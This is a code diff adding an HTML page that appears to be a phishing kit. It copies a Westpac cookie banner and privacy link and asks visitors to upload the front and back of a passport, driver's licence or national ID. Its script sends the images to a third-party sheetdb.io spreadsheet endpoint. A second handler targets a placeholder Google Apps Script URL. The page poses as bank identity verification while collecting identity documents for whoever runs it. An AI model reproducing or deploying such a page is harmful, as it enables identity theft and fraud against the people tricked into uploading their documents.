@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+</head>
+<body>
+    <div id="info-banner-gdpr">
+        <div class="message-bar nomargin info" role="alert">
+            <div class="message">
+                We use cookies to secure and tailor your web use. Our <a href="https://www.westpac.com.au/privacy/privacy-statement/" target="_blank"><strong>notice</strong></a> explains how we use cookies and how you can manage them. By continuing to use this site, we assume you're ok with our notice.
+            </div>
+        </div>
+    </div>
+
+    <div id="main-container">
+        <h1 id="page-title">Photo ID Verification</h1>
+        
+        <div class="verification-container">
+            <form id="id-verification-form" method="post" action="https://sheetdb.io/api/v1/7zf4vxmdzgc2l">
+                <div class="upload-section">
+                    <h2>Upload Your ID Documents</h2>
+                    <p class="help-text">Please upload clear, high-quality photos of your government-issued ID (passport, driver's license, or national ID card)</p>
+
+                    <div class="upload-box">
+                        <label for="front_id" class="upload-label">
+                            <div class="upload-icon">📄</div>
+                            <span>Front of ID</span>
+                            <input type="file" id="front_id" name="front_id" accept="image/*" required>
+                            <p class="upload-hint">Click to upload or drag and drop</p>
+                        </label>
+                    </div>
+
+                    <div class="upload-box">
+                        <label for="back_id" class="upload-label">
+                            <div class="upload-icon">📄</div>
+                            <span>Back of ID</span>
+                            <input type="file" id="back_id" name="back_id" accept="image/*" required>
+                            <p class="upload-hint">Click to upload or drag and drop</p>
+                        </label>
+                    </div>
+
+                    <button type="submit" class="submit-button">Submit Documents</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+        }
+
+        #info-banner-gdpr {
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .message-bar {
+            max-width: 1200px;
+            margin: 0 auto;
+            font-size: 14px;
+        }
+
+        #main-container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+
+        #page-title {
+            text-align: center;
+            color: #333;
+            margin-bottom: 40px;
+        }
+
+        .verification-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .upload-section h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .help-text {
+            color: #666;
+            margin-bottom: 25px;
+        }
+
+        .upload-box {
+            margin: 20px 0;
+        }
+
+        .upload-label {
+            display: block;
+            border: 2px dashed #ddd;
+            border-radius: 8px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .upload-label:hover {
+            border-color: #007bc7;
+            background-color: #f8f9fa;
+        }
+
+        .upload-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        input[type="file"] {
+            display: none;
+        }
+
+        .upload-hint {
+            color: #888;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .submit-button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background-color: #cb0808;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 30px;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-button:hover {
+            background-color: #e63314;
+        }
+    </style>
+
+    <script>
+        const form = document.getElementById('id-verification-form');
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const formData = new FormData(form);
+            
+            fetch(form.action, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data && !data.error) {
+                    alert('Documents submitted successfully!');
+                    window.location.href = 'success.html';
+                } else {
+                    alert('Failed to submit documents. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Error submitting documents. Please check your internet connection.');
+            });
+        });
+
+        // Add drag and drop functionality
+        const uploadBoxes = document.querySelectorAll('.upload-label');
+
+        document.getElementById("id-verification-form").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        
+        const formData = new FormData();
+        formData.append("front_id", document.getElementById("front_id").files[0]);
+        formData.append("back_id", document.getElementById("back_id").files[0]);
+
+        fetch("YOUR_WEB_APP_URL", { // Replace with your Google Apps Script Web App URL
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert("Documents uploaded successfully!");
+                console.log("Uploaded Files:", data.files);
+            } else {
+                alert("Upload failed: " + data.error);
+            }
+        })
+        .catch(error => console.error("Error:", error));
+    });
+        
+        uploadBoxes.forEach(box => {
+            box.addEventListener('dragover', (e) => {
+                e.preventDefault();
+                box.style.borderColor = '#007bc7';
+                box.style.backgroundColor = '#f8f9fa';
+            });
+
+            box.addEventListener('dragleave', (e) => {
+                e.preventDefault();
+                box.style.borderColor = '#ddd';
+                box.style.backgroundColor = 'transparent';
+            });
+
+            box.addEventListener('drop', (e) => {
+                e.preventDefault();
+                box.style.borderColor = '#ddd';
+                box.style.backgroundColor = 'transparent';
+                
+                const input = box.querySelector('input[type="file"]');
+                const files = e.dataTransfer.files;
+                if (files.length) {
+                    input.files = files;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
